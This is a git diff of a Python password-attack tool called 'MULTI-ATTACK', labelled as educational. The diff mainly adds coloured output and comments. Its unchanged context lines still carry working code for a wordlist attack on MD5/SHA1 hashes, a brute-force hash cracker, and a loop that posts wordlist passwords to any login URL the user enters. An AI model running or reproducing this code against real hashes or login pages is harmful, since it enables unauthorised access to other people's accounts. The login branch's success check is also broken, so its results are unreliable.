@@ -1,3 +1,4 @@
+#import all the necessary modules ...
 import hashlib
 import random
 import string
@@ -6,6 +7,8 @@ import requests
 import random
 from threading import Thread
 import os
+import colorama
+from colorama import Fore, Back, Style
 
 start = time.time()
 CharLength = 1
@@ -19,7 +22,10 @@ let_numbs = letters + numbs
 let_punc = letters + punc
 numbs_punc = numbs + punc
 all_characters = letters + numbs + punc
-print('''
+
+colorama.init(autoreset=True)#auto resets your settings after every output
+
+print(f'''{Fore.BLUE}
       ==========================================WELCOME TO MULTI-ATTACK=============================================================
       Author:Ntloyiya Okuhle
       Language:Python3                      =====  ====      =======
@@ -29,20 +35,21 @@ print('''
       *Note* This tools is made for educational purposes, if you are caught doing illegal actions with it I will not be responsible.
       ==============================================================================================================================
       \n\n''')
-
-type_of_attack = int(input("\nWhat type of attack do you want to do?\n\n"
+#select the type of attack you want to perform
+type_of_attack = int(input(f"{Fore.LIGHTMAGENTA_EX}\nWhat type of attack do you want to do?\n\n"
                            "1. Dictionary Attack\n"
                            "2. Brute Force Attack\n"
-                           "3. Random Login Attack\n\n"
+                           "3. Random Login Attack\n"
+                           "4.SSH/FTP Attack\n\n"
                            "Enter your choice: "))
 disc_list = []
 
-if type_of_attack == 1:
+if type_of_attack == 1:#dictionary attack option
     
-    hash = str(input("Enter the password hash: "))
+    hash = str(input("[+]Enter the password hash: "))
     try:
         
-        print("\nCracking......./")
+        print(Fore.YELLOW + "\nCracking......./")
         dictionary_file = open("Passwords.txt", errors="ignore")
         content = dictionary_file.readlines()
         for word in content:
@@ -50,7 +57,7 @@ if type_of_attack == 1:
             disc_list.append(new_word)
         for i in disc_list:
         
-            
+            #learn and match the hash entered with generated one
             if len(hash) == 32:
                 disc_hash = hashlib.md5(i.encode("utf-8")).hexdigest()
             elif len(hash) == 40:
@@ -60,23 +67,24 @@ if type_of_attack == 1:
             if disc_hash == hash:
                 time.sleep(0.5)
                 print("\n \n")
-                print("Trying password.....")
+                print(Fore.YELLOW + "Trying password.....")
                 end = time.time()
                 timetaken = end - start
                 print("\n \n")
                 print("Found it in ", timetaken, " seconds")
-                print("\n[*]Password found! ", i)
+                print(Fore.GREEN + "\n[*]Password found! ", i)
                 break
             if disc_hash != hash and disc_list.index(i) == len(disc_list) - 1:
-                print("Password not found!")
+                print(Fore.RED + "[-]Password not found!")
                 break
     except NameError:
-        print("Hash not defined!")
+        print(Fore.RED + "[!]Hash not defined!\n")
+        
 
-if type_of_attack == 2:
-    hash = str(input("Enter the password hash: "))
+if type_of_attack == 2:#Bruteforce attacking option
+    hash = str(input("[+]Enter the password hash: "))
     try:
-        type_of_characters = int(input("\nWhat type of characters do you want to try?\n\n"
+        type_of_characters = int(input(f"{Fore.LIGHTMAGENTA_EX}\nWhat type of characters do you want to try?\n\n"
                                     "1. All character\n"
                                     "2.Only letters\n"
                                     "3. Letters and numbers\n"
@@ -84,7 +92,7 @@ if type_of_attack == 2:
                                     "5. Numbers and punctuations\n"
                                     "6. Numbers only"
                                     "\n"
-                                    "Enter your choice here: "))
+                                    "[+]Enter your choice here: "))
         if type_of_characters == 1:
             choice_of_char = all_characters
         elif type_of_characters == 2:
@@ -101,7 +109,7 @@ if type_of_attack == 2:
         generated_hash = 0
         gen_str = 0
 
-        numb_of_char = int(input("\nHow many characters do you want to try: "))
+        numb_of_char = int(input(f"{Fore.LIGHTMAGENTA_EX}\nHow many characters do you want to try: "))
         print("\nCraking..../\n")
 
         while hash != generated_hash:
@@ -147,10 +155,10 @@ if type_of_attack == 2:
 
             # These print information for the user on the progress of the crack.
             #print("Similar Password: "+ gen_str )
-            print("We are currently at ", (counter / (time.time() - start)), "attempts per seconds")
-            print("It has been ", time.time() - start, " seconds!")
-            print("We have tried ", counter, " possible passwords!")
-            print("trying.......... " + str(gen_str))
+            print(f"{Fore.YELLOW}We are currently at ", (counter / (time.time() - start)), "attempts per seconds")
+            print(f"{Fore.YELLOW}It has been ", time.time() - start, " seconds!")
+            print(f"{Fore.YELLOW}We have tried ", counter, " possible passwords!")
+            print(f"{Fore.YELLOW}trying.......... " + str(gen_str))
 
 
             if len(hash) == 32:
@@ -169,7 +177,7 @@ if type_of_attack == 2:
                 #print the password found!
 
                 print("\n \n")
-                print(f"[*]Password found! {gen_str}")
+                print(Fore.GREEN + f"[*]Password found! {gen_str}")
                     # This tells the user how long it took to find the password as well as how many attempts it took.
                 print("\n \n")
                 print("Found it in ", timetaken, " seconds and ", counter, " attempts")
@@ -180,19 +188,21 @@ if type_of_attack == 2:
 
                 break
     except NameError:
-        print("Make sure you enter the hash password!")
+        print(Fore.RED + "\n[!]Make sure you enter the hash password!")
+    except KeyboardInterrupt:
+        print(f"{Fore.RED} \n[!]The hacking process was interupted , try again!")
     else:
-        print("Something is wrong, sorry for the inconveniences, kindly try again later!. ")
+        print(Fore.RED + "\n [!]Something is wrong, sorry for the inconveniences, kindly try again later!. ")
 if type_of_attack == 3:
     # define the webpage you want to crack
 
     # this page must be a login page with a username and password
 
-    url = input("Enter the target url: ")
+    url = input(f"{Fore.LIGHTMAGENTA_EX}[+]Enter the target url: ")
 
     # let's get the username
 
-    username = input("What is the username you wish to attempt?: ")
+    username = input(f"{Fore.LIGHTMAGENTA_EX}[+]What is the username you wish to attempt?: ")
 
     # next, let's get the password file
 
@@ -221,12 +231,13 @@ if type_of_attack == 3:
 
             if "Invalid Password" or "login failed!" in str(send_data_url.content):
 
-                print("[*] Attempting password: %s" % password)
+                print(Fore.YELLOW + "\n[*] Attempting password: %s" % password)
 
             else:
 
-                print("[*] Password found: %s " % password)
-    except ValueError:
-        print("Enter correct value!")
+                print(Fore.GREEN + "[*] Password found: %s " % password)
     except:
-        print("Something went wrong!, this maybe due to internet connection or you entered an incorrect url.")
+        print(Fore.RED + "\n [!]Something went wrong!, this maybe due to internet connection or you entered an incorrect url.")
+        
+if type_of_attack == 4:
+    print("[+]We are still working on this feature , come back later.")
